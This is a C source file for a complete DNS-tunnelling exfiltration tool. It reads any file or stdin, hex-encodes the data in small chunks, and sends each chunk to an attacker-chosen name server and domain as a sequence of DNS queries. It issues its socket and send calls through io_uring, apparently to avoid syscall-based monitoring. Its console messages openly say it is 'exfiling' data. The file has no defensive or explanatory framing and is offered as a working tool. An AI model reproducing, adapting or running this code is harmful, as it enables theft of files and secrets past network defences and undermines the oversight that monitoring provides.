#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#include "iouring_utils.h"

#define DNS_PORT    53
#define CHUNK_BYTES 30
#define MAX_DOMAIN  128

static int build_dns_query(uint8_t *pkt, size_t pkt_max,
                            const char *hex_chunk,
                            uint32_t seq,
                            const char *domain)
{

    uint8_t header[] = {
        0xde, 0xad,
        0x01, 0x00,
        0x00, 0x01,
        0x00, 0x00,
        0x00, 0x00,
        0x00, 0x00,
    };

    uint8_t *p = pkt;
    uint8_t *end = pkt + pkt_max;

    if (p + sizeof(header) >= end) return -1;
    memcpy(p, header, sizeof(header)); p += sizeof(header);

    size_t hlen = strlen(hex_chunk);
    if (p + 1 + hlen >= end) return -1;
    *p++ = (uint8_t)hlen;
    memcpy(p, hex_chunk, hlen); p += hlen;

    char seq_label[16];
    int slen = snprintf(seq_label, sizeof(seq_label), "%u", seq);
    if (p + 1 + (size_t)slen >= end) return -1;
    *p++ = (uint8_t)slen;
    memcpy(p, seq_label, (size_t)slen); p += (size_t)slen;

    char dom[MAX_DOMAIN];
    snprintf(dom, sizeof(dom), "%s", domain);
    char *tok = dom;
    char *next;
    while (tok && *tok) {
        next = strchr(tok, '.');
        if (next) *next = '\0';
        size_t llen = strlen(tok);
        if (llen > 63) llen = 63;
        if (p + 1 + llen >= end) return -1;
        *p++ = (uint8_t)llen;
        memcpy(p, tok, llen); p += llen;
        tok = next ? next + 1 : NULL;
    }

    if (p + 5 >= end) return -1;
    *p++ = 0x00;

    *p++ = 0x00; *p++ = 0x01;
    *p++ = 0x00; *p++ = 0x01;

    return (int)(p - pkt);
}

static void bytes_to_hex(const uint8_t *data, size_t len, char *hex)
{
    static const char h[] = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        hex[i*2]   = h[data[i] >> 4];
        hex[i*2+1] = h[data[i] & 0xf];
    }
    hex[len*2] = '\0';
}

int main(int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stderr, "usage: %s <ns_ip> <domain> <file|->\n", argv[0]);
        return 1;
    }

    const char *ns_ip  = argv[1];
    const char *domain = argv[2];
    const char *fpath  = argv[3];

    int fd_in;
    if (strcmp(fpath, "-") == 0) {
        fd_in = STDIN_FILENO;
    } else {
        fd_in = open(fpath, O_RDONLY);
        if (fd_in < 0) { perror("open"); return 1; }
    }

    uint8_t *data = malloc(1 << 20);
    ssize_t total = read(fd_in, data, (1 << 20) - 1);
    if (fd_in != STDIN_FILENO) close(fd_in);
    if (total <= 0) { fprintf(stderr, "no data\n"); return 1; }

    struct uring u = {};
    if (uring_init(&u, 16) < 0) { perror("uring_init"); return 1; }

    struct io_uring_sqe *sqe = uring_get_sqe(&u);
    sqe->opcode  = IORING_OP_SOCKET;
    sqe->fd      = AF_INET;
    sqe->off     = SOCK_DGRAM;
    sqe->len     = IPPROTO_UDP;
    uring_submit_wait(&u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(&u, &cqe);
    if ((int)cqe.res < 0) { perror("socket"); return 1; }
    int sock = (int)cqe.res;

    struct sockaddr_in ns_addr = {};
    ns_addr.sin_family      = AF_INET;
    ns_addr.sin_port        = htons(DNS_PORT);
    inet_pton(AF_INET, ns_ip, &ns_addr.sin_addr);

    uint8_t pkt[512];
    char hex_chunk[CHUNK_BYTES * 2 + 1];
    uint32_t seq = 0;
    ssize_t off = 0;
    int errors = 0;

    printf("[*] exfiling %zd bytes to %s (%s) via DNS\n", total, ns_ip, domain);

    while (off < total) {
        size_t chunk = (size_t)(total - off);
        if (chunk > CHUNK_BYTES) chunk = CHUNK_BYTES;

        bytes_to_hex(data + off, chunk, hex_chunk);
        int plen = build_dns_query(pkt, sizeof(pkt), hex_chunk, seq, domain);
        if (plen < 0) { errors++; off += (ssize_t)chunk; seq++; continue; }

        struct iovec iov = { .iov_base = pkt, .iov_len = (size_t)plen };
        struct msghdr msg = {};
        msg.msg_name    = &ns_addr;
        msg.msg_namelen = sizeof(ns_addr);
        msg.msg_iov     = &iov;
        msg.msg_iovlen  = 1;

        sqe = uring_get_sqe(&u);
        sqe->opcode = IORING_OP_SENDMSG;
        sqe->fd     = sock;
        sqe->addr   = (uint64_t)(uintptr_t)&msg;
        sqe->len    = 0;
        uring_submit_wait(&u, 1);
        uring_peek_cqe(&u, &cqe);

        if ((int)cqe.res < 0) {
            fprintf(stderr, "[-] sendmsg seq=%u: %s\n", seq, strerror(-(int)cqe.res));
            errors++;
        }

        off += (ssize_t)chunk; seq++;

        struct timespec ts = { .tv_nsec = 5000000L };
        nanosleep(&ts, NULL);
    }

    printf("[*] sent %u DNS queries, %d errors\n", seq, errors);

    sqe = uring_get_sqe(&u);
    sqe->opcode = IORING_OP_CLOSE; sqe->fd = sock;
    uring_submit_wait(&u, 1); uring_peek_cqe(&u, &cqe);

    free(data);
    uring_free(&u);
    return 0;
}
